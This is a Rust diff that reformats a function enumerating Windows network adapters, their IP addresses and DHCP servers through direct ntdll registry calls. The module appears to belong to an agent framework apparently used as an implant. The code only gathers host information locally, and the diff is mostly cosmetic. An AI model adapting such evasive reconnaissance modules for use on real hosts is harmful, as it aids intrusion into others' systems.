@@ -3,8 +3,8 @@ use core::slice;
 extern crate alloc;
 
 use alloc::{format, string::String, vec::Vec};
-use rs2_win32::ntdef::KeyBasicInformation;
 
+use kageshirei_win32::ntdef::KeyBasicInformation;
 use mod_agentcore::instance;
 
 use crate::nt_reg_api::{nt_open_key, nt_query_value_key};
@@ -16,15 +16,15 @@ use crate::nt_reg_api::{nt_open_key, nt_query_value_key};
 ///
 /// # Returns
 ///
-/// * `Result<Vec<(String, String, String)>, i32>` - A result containing a vector of tuples with the interface name, IP address, and DHCP server.
+/// * `Result<Vec<(String, String, String)>, i32>` - A result containing a vector of tuples with the interface name, IP
+///   address, and DHCP server.
 ///
 /// # Safety
 ///
 /// This function is unsafe because it interacts with raw pointers and low-level system calls.
 pub unsafe fn get_adapters_info() -> Result<Vec<(String, String, String)>, i32> {
     // Path to the registry key containing network interface information
-    let registry_key =
-        "\\Registry\\Machine\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Interfaces";
+    let registry_key = "\\Registry\\Machine\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Interfaces";
 
     // Open the registry key and obtain a handle
     let key_handle = match nt_open_key(registry_key) {
@@ -54,7 +54,8 @@ pub unsafe fn get_adapters_info() -> Result<Vec<(String, String, String)>, i32> 
             if index == 0 {
                 instance().ntdll.nt_close.run(key_handle);
                 return Err(status);
-            } else {
+            }
+            else {
                 break;
             }
         }
@@ -75,7 +76,7 @@ pub unsafe fn get_adapters_info() -> Result<Vec<(String, String, String)>, i32> 
             Err(_) => {
                 index += 1;
                 continue;
-            }
+            },
         };
 
         let mut name = String::new();
@@ -88,7 +89,8 @@ pub unsafe fn get_adapters_info() -> Result<Vec<(String, String, String)>, i32> 
                 ip_address = ip_address_value;
                 dhcp_server = dhcp_server_value;
             }
-        } else if let Ok(ip_address_value) = nt_query_value_key(sub_key_handle, "IPAddress\0") {
+        }
+        else if let Ok(ip_address_value) = nt_query_value_key(sub_key_handle, "IPAddress\0") {
             ip_address = ip_address_value;
         }
 
@@ -101,7 +103,8 @@ pub unsafe fn get_adapters_info() -> Result<Vec<(String, String, String)>, i32> 
 
         // Construct the path to the key that contains the interface name
         let name_key_path = format!(
-            "\\Registry\\Machine\\System\\CurrentControlSet\\Control\\Network\\{{4D36E972-E325-11CE-BFC1-08002BE10318}}\\{}\\Connection",
+            "\\Registry\\Machine\\System\\CurrentControlSet\\Control\\Network\\\
+             {{4D36E972-E325-11CE-BFC1-08002BE10318}}\\{}\\Connection",
             key_name_str
         );
 
@@ -111,7 +114,7 @@ pub unsafe fn get_adapters_info() -> Result<Vec<(String, String, String)>, i32> 
             Err(_) => {
                 index += 1;
                 continue;
-            }
+            },
         };
 
         // Query the "Name" value from the connection key
@@ -135,8 +138,9 @@ pub unsafe fn get_adapters_info() -> Result<Vec<(String, String, String)>, i32> 
 
 #[cfg(test)]
 mod tests {
-    use super::*;
     use libc_print::libc_println;
+
+    use super::*;
 
     #[test]
     fn test_get_adapters_info() {
@@ -146,7 +150,7 @@ mod tests {
                 Err(status) => {
                     libc_println!("NtOpenKey failed with NT STATUS: {:#X}", status);
                     return;
-                }
+                },
             };
 
             let test_one = &ip_addresses[0].1;
